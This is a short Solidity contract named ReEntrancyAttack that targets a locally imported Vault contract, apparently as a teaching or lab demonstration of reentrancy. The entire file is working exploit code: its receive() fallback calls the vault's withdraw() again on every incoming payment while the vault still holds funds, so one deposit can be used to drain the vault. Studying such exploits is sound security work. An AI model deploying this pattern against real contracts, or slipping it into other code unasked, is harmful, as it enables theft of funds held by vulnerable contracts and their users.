// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./vault.sol";

contract ReEntrancyAttack {
    
    Vault vaultContract;

    uint256 amount;

    constructor(Vault vaultAddress) {
        vaultContract = Vault(vaultAddress);
    }

    receive() external payable {
        if (address(vaultContract).balance >= amount) {
            vaultContract.withdraw();
        }
    }

    function deposit() public payable {
        amount = msg.value;
        vaultContract.deposit{value: msg.value}();
    }

    function withdraw() public {
        vaultContract.withdraw();
    }
}